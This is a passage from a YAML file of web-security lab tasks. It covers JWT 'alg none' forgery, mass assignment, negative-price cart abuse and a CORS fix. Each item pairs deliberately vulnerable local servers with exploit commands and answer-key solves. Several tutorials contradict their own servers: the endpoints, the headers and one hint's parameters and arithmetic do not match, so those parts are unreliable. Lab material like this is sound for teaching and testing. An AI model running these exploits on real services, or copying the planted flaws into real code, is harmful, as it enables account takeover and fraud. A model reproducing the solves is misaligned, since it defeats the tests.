                self.send_response(200 if payload.get("admin") else 403)
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            tok = mint({"admin": False, "user": "visitor"})
            b = b"Welcome, visitor. Try /admin"
            self.send_response(200); self.send_header("Set-Cookie", "token=" + tok)
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    b64() { printf %s "$1" | base64 | tr '+/' '-_' | tr -d '='; }
    tok="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"admin":true}')."
    curl -s -H "Cookie: token=$tok" http://127.0.0.1:8085/admin | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-028
  title: Promote yourself with mass assignment
  difficulty: 3
  kind: build
  tags: [web, mass-assignment, api, access-control]
  tutorial: |
    **What you're learning.** Mass assignment: sending extra fields the handler blindly copies.

    ### The idea

    If `register` copies **every** JSON field into the user record, you can set a field you shouldn't, like `role: admin`. Then your session is admin.

    ### Commands you'll use

    ```bash
    tok=$(curl -s -X POST http://127.0.0.1:8087/register \
      -H 'Content-Type: application/json' \
      -d '{"username":"attacker","password":"x","role":"admin"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
    curl -s -H "Authorization: Bearer $tok" http://127.0.0.1:8087/profile | grep -oE 'KL\{[^}]+\}'
    ```

    ### Common mistakes

    - The extra field name differing from what the model uses (`is_admin`, `role`, `admin`): try the ones the profile reveals.

    ### Check your work

    The profile shows `role: admin` and the flag.
  scenario: |
    The API at **`http://127.0.0.1:8087/register`** takes JSON `{"username":
    ..., "password": ...}` and returns a session token. The profile endpoint
    **`/me`** (header `X-Token: ...`) returns the flag only to accounts with
    **`role` = `admin`**. The register handler copies every field you send.

    Register an admin, then read `/me`, and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "Add an extra field: `{\"username\":\"attacker\",\"password\":\"x\",\"role\":\"admin\"}`."
    - "`curl -s -X POST -d '{...}' http://127.0.0.1:8087/register` returns `{\"token\": ...}`."
    - "`curl -s -H \"X-Token: $TOKEN\" http://127.0.0.1:8087/me`."
  solution: |
    ```bash
    tok=$(curl -s -X POST http://127.0.0.1:8087/register \
      -d '{"username":"attacker","password":"x","role":"admin"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
    curl -s -H "X-Token: $tok" http://127.0.0.1:8087/me | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target massassign 8087 <<'PY'
    import os, json, secrets, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8087"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    users = {}
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            if self.path != "/register":
                self.send_response(404); self.end_headers(); return
            n = int(self.headers.get("Content-Length", "0"))
            try:
                body = json.loads(self.rfile.read(n) or b"{}")
            except Exception:
                body = {}
            user = {"role": "user"}
            user.update(body)              # mass assignment: copies every field
            tok = secrets.token_hex(8)
            users[tok] = user
            b = json.dumps({"token": tok}).encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            if self.path != "/me":
                self.send_response(200); self.end_headers(); self.wfile.write(b"POST /register, then GET /me"); return
            u = users.get(self.headers.get("X-Token", ""))
            if u and u.get("role") == "admin":
                b = ("admin profile. Flag: " + FLAG).encode()
            else:
                b = b"regular user"
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    tok=$(curl -s -X POST http://127.0.0.1:8087/register -d '{"username":"attacker","password":"x","role":"admin"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
    curl -s -H "X-Token: $tok" http://127.0.0.1:8087/me | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-029
  title: Buy it for a negative price
  difficulty: 3
  kind: build
  tags: [web, business-logic, validation]
  tutorial: |
    **What you're learning.** Business-logic abuse: a negative quantity/price.

    ### The idea

    The server sums line totals without checking the **sign**. A negative-quantity line creates credit, letting you afford an expensive item while keeping the balance ≥ 0 at checkout. Use one cart (cookie jar) with two lines.

    ### Commands you'll use

    ```bash
    curl -s -c /tmp/j -X POST http://127.0.0.1:8088/buy --data 'item=filler&qty=-60'
    curl -s -b /tmp/j -c /tmp/j -X POST http://127.0.0.1:8088/buy --data 'item=vault&qty=1'
    curl -s -b /tmp/j http://127.0.0.1:8088/checkout | grep -oE 'KL\{[^}]+\}'
    ```
    Pick quantities so the total stays ≥ 0 but the vault is bought.

    ### Common mistakes

    - Separate carts (no shared cookie): the lines must be in one order.
    - A total that goes negative and is rejected.

    ### Check your work

    Checkout succeeds with the vault item and the flag, balance never negative.
  scenario: |
    The shop at **`http://127.0.0.1:8088/`** gives you a **100** credit
    balance. `POST /buy` with form fields `item` and `qty` charges
    `qty × price`. The flag item **`vault`** costs **500** — more than you
    have — but the server adds the (possibly negative) line totals without
    checking the sign. Your balance must stay **≥ 0** at checkout, which the
    flag endpoint enforces.

    Get the `vault` for a price you can afford, then read the flag it returns,
    and write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "Buy one `vault` (+500) and a negative quantity of a cheap item to pull the total back under 100."
    - "`filler` costs 10. Buying `qty=-60` of it is -600, so vault + filler = 500 - 600 = -100 ≤ 100."
    - "`curl -s -X POST http://127.0.0.1:8088/buy -d 'item=vault&qty=1' -d 'extra_item=filler&extra_qty=-60'` — or send two separate /buy calls in one session."
  solution: |
    ```bash
    # one cart, two lines: +500 for the vault, -600 for a negative filler qty
    curl -s -c /tmp/kl.jar -X POST http://127.0.0.1:8088/buy --data 'item=filler&qty=-60'
    curl -s -b /tmp/kl.jar -c /tmp/kl.jar -X POST http://127.0.0.1:8088/buy --data 'item=vault&qty=1' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target bizlogic 8088 <<'PY'
    import os, urllib.parse, secrets, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8088"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    PRICES = {"filler": 10, "vault": 500}
    carts = {}
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _sid(self):
            for kv in (self.headers.get("Cookie") or "").split(";"):
                if kv.strip().startswith("sid="):
                    return kv.strip()[4:]
            return None
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b"balance 100. POST /buy item=&qty=")
        def do_POST(self):
            sid = self._sid()
            new = sid is None or sid not in carts
            if new:
                sid = secrets.token_hex(8); carts[sid] = {"spent": 0, "got": set()}
            n = int(self.headers.get("Content-Length", "0"))
            d = urllib.parse.parse_qs(self.rfile.read(n).decode())
            item = d.get("item", [""])[0]
            try:
                qty = int(d.get("qty", ["0"])[0])
            except ValueError:
                qty = 0
            cart = carts[sid]
            if item in PRICES:
                cart["spent"] += PRICES[item] * qty
                if qty > 0:
                    cart["got"].add(item)
            bal = 100 - cart["spent"]
            if "vault" in cart["got"] and bal >= 0:
                body = "Order complete. Balance %d. Vault flag: %s" % (bal, FLAG)
            else:
                body = "cart total %d, balance %d" % (cart["spent"], bal)
            b = body.encode()
            self.send_response(200)
            if new:
                self.send_header("Set-Cookie", "sid=" + sid)
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s -c /tmp/kl.jar -X POST http://127.0.0.1:8088/buy --data 'item=filler&qty=-60' >/dev/null
    curl -s -b /tmp/kl.jar -c /tmp/kl.jar -X POST http://127.0.0.1:8088/buy --data 'item=vault&qty=1' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    rm -f /tmp/kl.jar

- id: offsec-web-032
  title: The API that trusts any Origin
  difficulty: 3
  kind: fix
  tags: [web, cors, misconfiguration, headers]
  tutorial: |
    **What you're learning.** The defender's side: fixing a reflect-any-origin CORS bug (sec-083's class).

    ### The idea

    Reflecting any `Origin` with `Access-Control-Allow-Credentials: true` lets any site read a logged-in user's data. Reflect **only the allowed origin**, and send CORS headers only for it. Add `Vary: Origin`.

    ### Commands you'll use

    ```python
    ALLOWED = "https://app.example.test"
    origin = self.headers.get("Origin", "")
    self.send_header("Vary", "Origin")
    if origin == ALLOWED:
        self.send_header("Access-Control-Allow-Origin", ALLOWED)
        self.send_header("Access-Control-Allow-Credentials", "true")
    ```
    ```bash
    curl -si -H 'Origin: https://evil.test' http://127.0.0.1:8091/api | grep -i access-control   # none
    curl -si -H 'Origin: https://app.example.test' http://127.0.0.1:8091/api | grep -i access-control
    ```

    ### Common mistakes

    - `endswith('example.test')`: `evil-example.test` passes.
    - `*` with credentials: browsers reject it.

    ### Check your work

    Only the allowed origin gets CORS headers; others get none.
  scenario: |
    **`/lab/cors/app.py`** is the account API. It reflects whatever `Origin`
    the request sends and allows credentials, so any site can read a logged-in
    user's data. The flag is in **`/app/flag.txt`** and the check starts your
    fixed app.

    Fix the app so it only reflects the **allowed** origin
    **`https://app.example.test`** (and sends the CORS headers only for that
    origin), and keep `Access-Control-Allow-Credentials: true` for it. Other
    origins must get **no** `Access-Control-Allow-Origin` header.
  hints:
    - "Don't echo `Origin` unconditionally. Compare it to `https://app.example.test`."
    - "Only set `Access-Control-Allow-Origin` (and `-Allow-Credentials`) when the origin matches."
  solution: |
    ```python
    ALLOWED = "https://app.example.test"
    origin = self.headers.get("Origin", "")
    if origin == ALLOWED:
        self.send_header("Access-Control-Allow-Origin", ALLOWED)
        self.send_header("Access-Control-Allow-Credentials", "true")
    ```
  setup: |
    rm -rf /lab/cors; mkdir -p /lab/cors
    FLAG=$(rand_flag); echo "$FLAG" > "$KL_STATE/answer"
    echo "$FLAG" > "$KL_STATE/flag"
    lab_file /lab/cors/app.py <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8091"))
    FLAG = open("/app/flag.txt").read().strip()
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            origin = self.headers.get("Origin", "")
            self.send_response(200)
            # BUG: reflects any origin and allows credentials
            self.send_header("Access-Control-Allow-Origin", origin)
            self.send_header("Access-Control-Allow-Credentials", "true")
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(('{"flag": "%s"}' % FLAG).encode())
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    port=8091
    docker rm -f kl-corsfix >/dev/null 2>&1
    cp "$KL_STATE/flag" /lab/cors/flag.txt
    docker run -d --name kl-corsfix --restart unless-stopped -p 127.0.0.1:$port:$port -e PORT=$port \
      -v /lab/cors/app.py:/app/app.py:ro -v /lab/cors/flag.txt:/app/flag.txt:ro python:3.12-alpine python /app/app.py >/dev/null
    on_reset 'docker rm -f kl-corsfix >/dev/null 2>&1'
    eventually 20 "curl -fsS -o /dev/null http://127.0.0.1:$port/"
    good=$(curl -s -D - -o /dev/null -H 'Origin: https://app.example.test' http://127.0.0.1:$port/ | tr -d '\r')
    evil=$(curl -s -D - -o /dev/null -H 'Origin: https://evil.example' http://127.0.0.1:$port/ | tr -d '\r')
    check_match "the allowed origin is reflected" "$good" 'Access-Control-Allow-Origin: https://app.example.test'
    check_match "credentials stay allowed for it" "$good" 'Access-Control-Allow-Credentials: true'
    check_not "an untrusted origin gets no ACAO header" 'grep -qi "Access-Control-Allow-Origin" <<<"$evil"'
    check "the app still serves the account data" 'curl -fsS http://127.0.0.1:$port/ | grep -q KL'
  solve: |
    cat > /lab/cors/app.py <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8091"))
    FLAG = open("/app/flag.txt").read().strip()
    ALLOWED = "https://app.example.test"
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            origin = self.headers.get("Origin", "")
            self.send_response(200)
            if origin == ALLOWED:
                self.send_header("Access-Control-Allow-Origin", ALLOWED)
                self.send_header("Access-Control-Allow-Credentials", "true")
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(('{"flag": "%s"}' % FLAG).encode())
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
